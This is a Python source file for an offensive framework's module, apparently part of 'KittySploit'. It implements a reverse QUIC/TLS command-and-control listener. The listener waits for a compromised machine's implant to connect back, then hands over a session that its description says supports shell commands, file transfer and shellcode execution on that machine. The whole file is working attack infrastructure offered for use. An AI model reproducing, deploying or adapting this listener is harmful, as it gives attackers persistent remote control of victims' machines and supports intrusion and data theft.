#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Reverse QUIC C2 listener for compatible implants (ALPN kitty-quic)."""

from kittysploit import *

import asyncio
import os
import threading

try:
    from aioquic.asyncio import serve
    from aioquic.quic.configuration import QuicConfiguration

    AIOQUIC_AVAILABLE = True
except ImportError:
    AIOQUIC_AVAILABLE = False

from lib.protocols.quic.c2_server import C2ServerProtocol
from lib.protocols.quic.certs import ensure_cert_pair
from lib.protocols.quic.constants import DEFAULT_QUIC_ALPN
from lib.protocols.quic.session_client import QuicSessionClient


class Module(Listener):

    __info__ = {
        "name": "Reverse QUIC C2 Listener",
        "description": (
            "Reverse QUIC/TLS 1.3 listener for KittySploit implants (ALPN kitty-quic). "
            "Supports shell commands, file upload/download, and shellcode execution."
        ),
        "author": "KittySploit Team",
        "version": "1.0.0",
        "handler": Handler.REVERSE,
        "session_type": SessionType.QUIC,
        "references": [
            "https://datatracker.ietf.org/doc/html/rfc9000",
        ],
        "dependencies": ["aioquic"],
    }

    lhost = OptString("127.0.0.1", "Local bind address", True)
    lport = OptPort(4433, "Local QUIC port", True)
    cert_file = OptString("data/certs/quic/cert.pem", "TLS certificate (PEM)", True)
    key_file = OptString("data/certs/quic/key.pem", "TLS private key (PEM)", True)
    alpn = OptString(DEFAULT_QUIC_ALPN, "QUIC ALPN token expected by the implant", True)
    auto_cert = OptBool(True, "Auto-generate self-signed cert when missing", False)

    def run(self):
        if not AIOQUIC_AVAILABLE:
            print_error("aioquic is required but not installed")
            print_info("Install it with: pip install aioquic")
            return False

        host = str(self.lhost).strip() if self.lhost else "127.0.0.1"
        port = int(self.lport) if self.lport else 4433
        alpn_token = str(self.alpn).strip() if self.alpn else DEFAULT_QUIC_ALPN
        cert_path = str(self.cert_file).strip() if self.cert_file else "data/certs/quic/cert.pem"
        key_path = str(self.key_file).strip() if self.key_file else "data/certs/quic/key.pem"

        if self.auto_cert:
            try:
                cert_path, key_path = ensure_cert_pair(cert_path, key_path)
                print_status(f"Using TLS cert: {cert_path}")
            except Exception as exc:
                print_error(f"Failed to prepare TLS certificate: {exc}")
                return False
        elif not os.path.isfile(cert_path) or not os.path.isfile(key_path):
            print_error("Certificate files missing. Generate with:")
            print_error(
                "  openssl req -x509 -newkey rsa:2048 -keyout key.pem "
                "-out cert.pem -days 365 -nodes -subj '/CN=localhost'"
            )
            print_info("Or set auto_cert true to generate automatically.")
            return False

        connection_ready = threading.Event()
        accepted_protocol_ref = []
        accepted_peer_ref = []
        server_loop_ref = []
        server_holder = {"server": None}

        def on_connected(protocol: C2ServerProtocol):
            peer = protocol.peer_address
            accepted_peer_ref.append(peer)
            accepted_protocol_ref.append(protocol)
            connection_ready.set()

        def create_protocol(*args, **kwargs):
            return C2ServerProtocol(*args, on_connected=on_connected, **kwargs)

        config = QuicConfiguration(is_client=False, alpn_protocols=[alpn_token])
        config.load_cert_chain(str(cert_path), str(key_path))
        config.max_idle_timeout = 600_000

        async def run_server():
            server = await serve(host, port, configuration=config, create_protocol=create_protocol)
            server_holder["server"] = server
            server_loop_ref.append(asyncio.get_running_loop())
            await asyncio.Event().wait()

        def server_thread_fn():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            try:
                loop.run_until_complete(run_server())
            except asyncio.CancelledError:
                pass
            finally:
                loop.close()

        try:
            print_status(f"Starting QUIC C2 server on quic://{host}:{port} (ALPN={alpn_token})")
            print_status("Waiting for implant connection...")
            server_thread = threading.Thread(target=server_thread_fn, daemon=True)
            server_thread.start()

            while not connection_ready.wait(timeout=0.5):
                if self.stop_flag.is_set():
                    server = server_holder.get("server")
                    if server and server_loop_ref:
                        asyncio.run_coroutine_threadsafe(server.close(), server_loop_ref[0])
                    return False

            if not accepted_protocol_ref or not accepted_peer_ref or not server_loop_ref:
                if self.stop_flag.is_set():
                    return False
                return None

            protocol = accepted_protocol_ref[0]
            target, port_num = accepted_peer_ref[0]
            loop = server_loop_ref[0]
            print_success(f"QUIC implant connected from {target}:{port_num}")

            client = QuicSessionClient(protocol, loop)
            additional_data = {
                "protocol": "quic",
                "connection_type": "reverse",
                "alpn": alpn_token,
                "connection": client,
            }
            return (client, target, port_num, additional_data)

        except Exception as exc:
            if not self.stop_flag.is_set():
                print_error(f"QUIC listener error: {exc}")
            return False

    def shutdown(self):
        try:
            if hasattr(self, "_session_connections"):
                for _session_id, conn in list(self._session_connections.items()):
                    if conn and hasattr(conn, "close"):
                        conn.close()
        except Exception:
            pass
